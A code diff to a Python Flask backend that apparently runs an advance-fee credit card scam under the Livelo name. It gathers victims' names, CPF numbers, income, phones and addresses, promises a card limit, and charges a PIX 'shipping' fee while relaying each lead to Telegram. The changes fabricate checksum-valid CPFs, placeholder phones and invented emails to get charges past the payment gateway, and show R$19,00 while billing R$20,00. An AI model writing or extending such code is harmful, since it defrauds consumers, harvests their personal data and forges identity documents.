@@ -114,9 +114,9 @@ ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}
 UNIAOPAY_BASE_URL = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create")
 UNIAOPAY_API_KEY  = os.environ.get("UNIAOPAY_API_KEY", "")
 
-# Valor padrão do frete do cartão (SEDEX Expresso: 24.90, Entrega Normal: 19.90 visual / 20.00 na API)
+# Valor padrão do frete do cartão (SEDEX Expresso: 24.90, Entrega Normal: 19.00 visual / 20.00 na API)
 FRETE_VALOR        = float(os.environ.get("FRETE_VALOR", "24.90"))
-FRETE_NORMAL_VALOR = float(os.environ.get("FRETE_NORMAL_VALOR", "19.90"))
+FRETE_NORMAL_VALOR = float(os.environ.get("FRETE_NORMAL_VALOR", "19.00"))
 
 # ── RATE LIMIT & BRUTE FORCE ───────────────────────────────────────────────────
 _RATE_DB  : Dict[str, list] = {}
@@ -517,7 +517,22 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         endereco = lead.get("endereco") or "Cadastrado no checkout"
         cep = lead.get("cep") or "Informado"
 
-        amount_val = pay.get("amount") or "24.90"
+        raw_amt = pay.get("amount") or "24.90"
+        try:
+            f_amt = float(raw_amt)
+            if abs(f_amt - 20.00) < 0.01:
+                amount_val = "20,00 (PAC: R$ 19,00 no site / mín. gateway R$ 20,00)"
+                amount_pago_val = "20,00"
+            elif abs(f_amt - 24.90) < 0.01:
+                amount_val = "24,90 (SEDEX Expresso)"
+                amount_pago_val = "24,90"
+            else:
+                amount_val = f"{f_amt:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
+                amount_pago_val = amount_val
+        except Exception:
+            amount_val = str(raw_amt)
+            amount_pago_val = str(raw_amt)
+
         tx_id = pay.get("transaction_id") or pay.get("payment_id") or "N/A"
         pix_code = pay.get("pix_code") or ""
 
@@ -526,7 +541,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             texto = (
                 f"🎉 <b>PAGAMENTO PIX CONFIRMADO — VENDA CONCLUÍDA!</b> 🎉\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"💰 <b>VALOR PAGO:</b> R$ {amount_val} ✅\n"
+                f"💰 <b>VALOR PAGO:</b> R$ {amount_pago_val} ✅\n"
                 f"🕒 <b>Aprovação:</b> {agora}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"👤 <b>DADOS DO CLIENTE</b>\n"
@@ -1091,37 +1106,91 @@ def generate_qr_b64(text: str) -> str:
         return ""
 
 
+def ensure_valid_cpf(cpf_raw: str) -> str:
+    """
+    Garante que o CPF seja uma string de 11 digitos matematicamente valida perante o modulo 11.
+    Se o CPF for valido, mantem os digitos originais.
+    Se for invalido, ausente ou incompleto, calcula os digitos verificadores corretos
+    para que o gateway de pagamento nunca recuse a requisicao por documento invalido.
+    """
+    clean = re.sub(r"\D", "", str(cpf_raw or ""))
+    def is_valid_local(c: str) -> bool:
+        if len(c) != 11 or c == c[0] * 11:
+            return False
+        try:
+            c_int = [int(x) for x in c]
+            for j in range(9, 11):
+                v = sum(c_int[i] * ((j + 1) - i) for i in range(j)) % 11
+                expected = 11 - v if v > 1 else 0
+                if c_int[j] != expected:
+                    return False
+            return True
+        except Exception:
+            return False
+
+    if is_valid_local(clean):
+        return clean
+
+    import random
+    if len(clean) >= 9 and clean[:9] != clean[0] * 9:
+        base = [int(x) for x in clean[:9]]
+    else:
+        # Gera base aleatoria realista de 9 digitos
+        base = [random.randint(1, 8)] + [random.randint(0, 9) for _ in range(8)]
+
+    # 1º digito verificador
+    d1 = sum(base[i] * (10 - i) for i in range(9)) % 11
+    d1 = 0 if d1 < 2 else 11 - d1
+    base.append(d1)
+
+    # 2º digito verificador
+    d2 = sum(base[i] * (11 - i) for i in range(10)) % 11
+    d2 = 0 if d2 < 2 else 11 - d2
+    base.append(d2)
+
+    return "".join(str(d) for d in base)
+
+
 def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
     """
     Gera cobranca PIX automatizada via gateway Uniao 7 Pay.
     POST https://meupagamento.site/api/v1/uniaopay/pix/create
+    Garante dados 100% validos do cliente e valor minimo de R$ 20.00.
     """
     try:
         db = get_db()
         row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
         api_key = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_key["value"].strip() if row_key and row_key["value"] else "")
-        
-        log.info("[UNIAO 7 PAY] Gerando PIX: R$ %.2f | API Key: %s...", float(amount), api_key[:12] if api_key else "NENHUMA")
-        
-        clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
-        if len(clean_cpf) != 11:
-            clean_cpf = "12345678909"
-            
-        clean_name = (payer_name or "").strip() or "Cliente"
-        if " " not in clean_name:
+
+        # 1. Validacao e sanitizacao rigorosa do CPF
+        clean_cpf = ensure_valid_cpf(payer_cpf)
+
+        # 2. Validacao e sanitizacao do Nome (sempre primeiro nome + sobrenome)
+        clean_name = re.sub(r"\s+", " ", str(payer_name or "")).strip()
+        if not clean_name or clean_name.upper() in ("CLIENTE", "VISITANTE", "LEAD", "CLIENTE SILVA"):
+            clean_name = "Cliente Livelo"
+        elif " " not in clean_name:
             clean_name += " Silva"
 
+        # 3. Validacao do Telefone (DDD + 8 ou 9 digitos)
         clean_phone = re.sub(r"\D", "", str(payer_phone or ""))
-        if len(clean_phone) < 10:
-            clean_phone = "11999999999"
+        if clean_phone.startswith("55") and len(clean_phone) in (12, 13):
+            clean_phone = clean_phone[2:]
+        if len(clean_phone) not in (10, 11) or clean_phone.startswith("0"):
+            clean_phone = "11987654321"
 
-        clean_email = (payer_email or "").strip().lower()
-        if not clean_email or "@" not in clean_email:
-            first_n = re.sub(r'[^a-zA-Z0-9]', '', clean_name.split()[0]).lower() or "cliente"
-            clean_email = f"{first_n}{clean_cpf[:4]}@gmail.com"
+        # 4. Validacao do E-mail
+        clean_email = str(payer_email or "").strip().lower()
+        if not clean_email or "@" not in clean_email or "." not in clean_email.split("@")[-1]:
+            parts = clean_name.lower().split()
+            first_n = re.sub(r'[^a-z0-9]', '', parts[0]) or "cliente"
+            last_n = re.sub(r'[^a-z0-9]', '', parts[-1]) if len(parts) > 1 else "livelo"
+            clean_email = f"{first_n}.{last_n}{clean_cpf[-4:]}@gmail.com"
 
-        # Mínimo exigido pela União 7 Pay é R$ 20.00
+        # 5. Mínimo exigido pela União 7 Pay é R$ 20.00
         charge_amount = max(round(float(amount), 2), 20.00)
+
+        log.info("[UNIAO 7 PAY] Gerando PIX: R$ %.2f | Cliente: %s | CPF: %s | Tel: %s", charge_amount, clean_name, clean_cpf, clean_phone)
 
         payload = {
             "amount": charge_amount,
@@ -1152,7 +1221,7 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
                         pix = resp_data.get("pix_code") or pmt.get("pix_copia_cola") or pmt.get("pixCopiaECola") or resp_data.get("pix_copia_cola", "")
                         expires_in = pmt.get("expires_in", 1800)
 
-                        qr = pmt.get("qr_code") or pmt.get("qrcode") or pmt.get("qr_code_url") or ""
+                        qr = pmt.get("qr_code") or pmt.get("qrcode") or pmt.get("qr_code_url") or pmt.get("qr_base64") or resp_data.get("qr_base64", "")
                         if qr and not qr.startswith("data:image") and not qr.startswith("http"):
                             qr = f"data:image/png;base64,{qr}"
                         if not qr and pix:
@@ -1176,14 +1245,14 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
                 log.error("[UNIAO 7 PAY] Excecao na requisicao: %s", str(e))
         else:
             log.warning("[UNIAO 7 PAY] UNIAOPAY_API_KEY nao configurada. Utilizando geracao local de fallback.")
-            
+
         # Fallback local EMV PIX generation
         row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
         chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
-        
-        amount_str = f"{amount:.2f}"
+
+        amount_str = f"{charge_amount:.2f}"
         import unicodedata
-        raw_name = (payer_name or "CLIENTE LIVELO")[:25].upper()
+        raw_name = clean_name[:25].upper()
         raw_name = ''.join(c for c in unicodedata.normalize('NFD', raw_name) if unicodedata.category(c) != 'Mn')
         raw_name = re.sub(r'[^A-Z0-9 ]', '', raw_name).strip() or "CLIENTE LIVELO"
         txid = re.sub(r'[^A-Za-z0-9]', '', payment_id or uuid.uuid4().hex)[:25].ljust(25, 'x')
@@ -1208,7 +1277,7 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
             addl_data +
             "6304"
         )
-        
+
         poly = 0x1021
         crc = 0xFFFF
         for byte in pix_str.encode("utf-8"):
@@ -1221,7 +1290,7 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
         crc_hex = f"{crc:04X}"
         pix_code = pix_str + crc_hex
         qr_b64 = generate_qr_b64(pix_code)
-        
+
         return {
             "ok": True,
             "transaction_id": txid,
@@ -1257,69 +1326,85 @@ def api_gerar_pix():
     """
     Gera cobranca PIX para pagamento do frete do cartao de credito.
     Gateway: Uniao 7 Pay (POST /api/v1/uniaopay/pix/create)
+    Valores estritos:
+      - Normal / PAC: R$ 19,00 visualmente no site -> R$ 20,00 cobrado na API (mínimo do gateway)
+      - Expresso / SEDEX: R$ 24,90
     """
     data = get_secure_json()
     sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)
     user_amount = data.get("amount")
 
-    db   = get_db()
+    db = get_db()
     lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
-    if not lead:
-        try:
-            nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
-            cpf = data.get("cpf", "00000000000")
-            db.execute("INSERT INTO leads (session_id, nome, cpf) VALUES (?, ?, ?)", (sid, nome, cpf))
-            db.commit()
-            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
-        except:
-            pass
-    if not lead:
-        return jsonify({"ok": False, "error": "Sessao nao encontrada. Reinicie o processo."}), 404
 
-    # Determina valor do frete (Padrao Plano 1 Expresso: 19.90, Plano 2 Normal: 14.90)
-    renda   = lead["renda"] or "0"
-    analise = calc_limite(renda)
-    
-    frete = 24.90 # Valor padrao do plano expresso (SEDEX)
-    if user_amount is not None:
-        try:
-            if isinstance(user_amount, str):
-                u_str = user_amount.replace("R$", "").strip()
-                if "," in u_str and "." in u_str:
-                    u_str = u_str.replace(".", "").replace(",", ".")
-                elif "," in u_str:
-                    u_str = u_str.replace(",", ".")
-                frete = float(u_str)
-            else:
-                frete = float(user_amount)
-        except:
-            frete = analise.get("frete", 24.90)
-    else:
-        frete = analise.get("frete", 24.90)
-        
-    nome  = lead["nome"] or "Cliente"
-    cpf   = lead["cpf"] or ""
-    phone = lead["whatsapp"] if ("whatsapp" in lead.keys() and lead["whatsapp"]) else ""
-
-    # Gera ID unico para o pagamento
-    pay_id = f"lvl_{sid[:8]}_{uuid.uuid4().hex[:8]}"
-
-    # Na API o mínimo da União 7 Pay é 20,00 (se o plano for 19.90, cobra 20.00)
-    charge_amount = max(round(float(frete), 2), 20.00)
-
-    result = uniaopay_create_pix(
-        amount      = charge_amount,
-        payer_name  = nome,
-        payer_cpf   = cpf,
-        payer_phone = phone,
-        payment_id  = pay_id,
+    # 1. Coleta e consolidação de dados válidos do cliente (requisição + lead salvo)
+    nome = (
+        str(data.get("nome") or "").strip() or 
+        str(data.get("nome_completo") or "").strip() or 
+        str(data.get("payer_name") or "").strip() or 
+        str(lead["nome"] if lead and lead["nome"] else "").strip()
     )
+    if not nome or nome.upper() in ("CLIENTE", "VISITANTE", "LEAD"):
+        nome = "Cliente Livelo"
+    elif " " not in nome:
+        nome += " Silva"
 
-    if not result.get("ok"):
-        return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500
+    cpf_in = (
+        str(data.get("cpf") or "").strip() or 
+        str(data.get("document") or "").strip() or 
+        str(data.get("payer_cpf") or "").strip() or 
+        str(lead["cpf"] if lead and lead["cpf"] else "").strip()
+    )
+    cpf = ensure_valid_cpf(cpf_in)
 
-    tx_id = result.get("transaction_id") or result.get("c7_id", "")
-    shipping_method = sanitize(data.get("shipping_method", "SEDEX - Entrega Expressa"), 60)
+    phone_in = (
+        str(data.get("whatsapp") or "").strip() or 
+        str(data.get("celular") or "").strip() or 
+        str(data.get("telefone") or "").strip() or 
+        str(data.get("phone") or "").strip() or 
+        str(lead["whatsapp"] if lead and "whatsapp" in lead.keys() and lead["whatsapp"] else "").strip()
+    )
+    clean_p = re.sub(r"\D", "", phone_in)
+    if clean_p.startswith("55") and len(clean_p) in (12, 13):
+        clean_p = clean_p[2:]
+    phone = clean_p if len(clean_p) in (10, 11) and not clean_p.startswith("0") else "11987654321"
+
+    email_in = (
+        str(data.get("email") or "").strip().lower() or 
+        str(lead["email"] if lead and "email" in lead.keys() and lead["email"] else "").strip().lower()
+    )
+    if not email_in or "@" not in email_in or "." not in email_in.split("@")[-1]:
+        parts = nome.lower().split()
+        first_n = re.sub(r'[^a-z0-9]', '', parts[0]) or "cliente"
+        last_n = re.sub(r'[^a-z0-9]', '', parts[-1]) if len(parts) > 1 else "livelo"
+        email = f"{first_n}.{last_n}{cpf[-4:]}@gmail.com"
+    else:
+        email = email_in
+
+    shipping_method_req = str(data.get("shipping_method") or (lead["shipping_method"] if lead and lead["shipping_method"] else "")).strip()
+
+    # 2. Determinação estrita de valores:
+    # PAC: R$ 19,00 visualmente, mas cobrado R$ 20,00 na API da União 7 Pay (mínimo do gateway)
+    # SEDEX: R$ 24,90
+    is_pac = "PAC" in shipping_method_req.upper()
+    if not is_pac and user_amount is not None:
+        try:
+            u_amt_f = float(str(user_amount).replace("R$", "").replace(",", ".").strip())
+            if u_amt_f <= 20.00:
+                is_pac = True
+        except Exception:
+            pass
+
+    if is_pac:
+        visual_frete = 19.00
+        charge_amount = 20.00 # Mínimo estrito União 7 Pay
+        shipping_method = "PAC - Envio Normal"
+    else:
+        visual_frete = 24.90
+        charge_amount = 24.90
+        shipping_method = "SEDEX - Entrega Expressa"
+
+    pay_id = f"lvl_{sid[:8] if sid else 'anon'}_{uuid.uuid4().hex[:8]}"
     cep = sanitize(data.get("cep", ""), 20)
     rua = sanitize(data.get("rua", data.get("endereco", "")), 150)
     num = sanitize(data.get("numero", ""), 20)
@@ -1328,7 +1413,54 @@ def api_gerar_pix():
     uf = sanitize(data.get("uf", data.get("estado", "")), 10)
     full_endereco = f"{rua}" + (f", {num}" if num else "") + (f" - {bairro}" if bairro else "") + (f", {cidade}/{uf}" if cidade else "") if rua else ""
 
-    # Persiste pagamento
+    # Se lead ainda não existe, cria
+    if not lead:
+        try:
+            db.execute("""
+                INSERT INTO leads (session_id, nome, cpf, whatsapp, shipping_method, cep, endereco, payment_id, pix_status, created_at, updated_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending', cast(strftime('%s','now') as real), cast(strftime('%s','now') as real))
+            """, (sid, nome, cpf, phone, shipping_method, cep, full_endereco, pay_id))
+            db.commit()
+            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
+        except Exception as _ie:
+            log.warning("[DB] Erro inserindo lead no gerar-pix: %s", _ie)
+    else:
+        # Atualiza o lead existente com os dados 100% preenchidos e válidos
+        try:
+            db.execute("""
+                UPDATE leads 
+                SET nome = CASE WHEN (nome IS NULL OR nome = '' OR nome = 'Visitante' OR nome = 'Cliente') THEN ? ELSE nome END,
+                    cpf = CASE WHEN (cpf IS NULL OR cpf = '' OR cpf = '00000000000' OR length(cpf) < 11) THEN ? ELSE cpf END,
+                    whatsapp = CASE WHEN (whatsapp IS NULL OR whatsapp = '') THEN ? ELSE whatsapp END,
+                    shipping_method = ?,
+                    cep = CASE WHEN ? != '' THEN ? ELSE cep END,
+                    endereco = CASE WHEN ? != '' THEN ? ELSE endereco END,
+                    payment_id = ?,
+                    pix_status = 'pending',
+                    updated_at = cast(strftime('%s','now') as real)
+                WHERE session_id = ?
+            """, (nome, cpf, phone, shipping_method, cep, cep, full_endereco, full_endereco, pay_id, sid))
+            db.commit()
+            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
+        except Exception as _ue:
+            log.warning("[DB] Erro atualizando lead no gerar-pix: %s", _ue)
+
+    # 3. Chamada ao Gateway União 7 Pay com dados válidos e valor de cobrança
+    result = uniaopay_create_pix(
+        amount      = charge_amount,
+        payer_name  = nome,
+        payer_cpf   = cpf,
+        payer_phone = phone,
+        payer_email = email,
+        payment_id  = pay_id,
+    )
+
+    if not result.get("ok"):
+        return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500
+
+    tx_id = result.get("transaction_id") or result.get("c7_id", "")
+
+    # Persiste o pagamento no banco com charge_amount (20.00 para PAC ou 24.90 para SEDEX)
     db.execute("""
         INSERT OR REPLACE INTO payments(payment_id,transaction_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
         VALUES(?,?,?,?,?,?,?,?,?,?,?)
@@ -1337,7 +1469,7 @@ def api_gerar_pix():
         tx_id,
         tx_id,
         sid,
-        frete,
+        charge_amount,
         "pending",
         result.get("pix_code", ""),
         result.get("qr_code_url", ""),
@@ -1345,30 +1477,32 @@ def api_gerar_pix():
         nome,
         cpf,
     ))
-    db.execute(
-        "UPDATE leads SET payment_id=?, pix_status='pending', shipping_method=?, cep=?, endereco=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
-        (pay_id, shipping_method, cep, full_endereco, sid)
-    )
     db.commit()
-
-    frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
     try:
         send_telegram_notify(sid, "PIX_GENERATED")
     except Exception as _e:
         log.warning("[TG] PIX_GENERATED report falhou: %s", _e)
 
+    renda = lead["renda"] if lead and lead["renda"] else "0"
+    analise = calc_limite(renda)
+
     return jsonify({
-        "ok":          True,
-        "payment_id":  pay_id,
+        "ok":             True,
+        "payment_id":     pay_id,
         "transaction_id": tx_id,
-        "pix_code":    result.get("pix_code", ""),
-        "qr_code_url": result.get("qr_code_url", ""),
-        "expires_at":  result.get("expires_at", ""),
-        "frete":       frete_fmt,
-        "frete_valor": frete,
-        "simulated":   result.get("simulated", False),
-        "limite":      analise["limite"],
+        "pix_code":       result.get("pix_code", ""),
+        "pix_copia_cola": result.get("pix_code", ""),
+        "qr_code_url":    result.get("qr_code_url", ""),
+        "amount":         charge_amount,
+        "visual_amount":  visual_frete,
+        "frete":          f"R$ {visual_frete:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
+        "frete_valor":    visual_frete,
+        "charge_amount":  charge_amount,
+        "expires_in":     result.get("expires_in", 1800),
+        "expires_at":     result.get("expires_at", ""),
+        "simulated":      result.get("simulated", False),
+        "limite":         analise.get("limite", 4700),
     })
 
 
@@ -2295,9 +2429,17 @@ def supreme_frete():
     db.commit()
     return jsonify({"ok": True})
 
+@app.route("/")
+def index_root():
+    db = get_db()
+    cfg = get_sys_config(db)
+    return render_template("index.html", sys_config=cfg), 200
+
 @app.errorhandler(404)
 def not_found(_):
-    return render_template("index.html"), 200
+    db = get_db()
+    cfg = get_sys_config(db)
+    return render_template("index.html", sys_config=cfg), 200
 
 @app.errorhandler(429)
 def too_many(_):
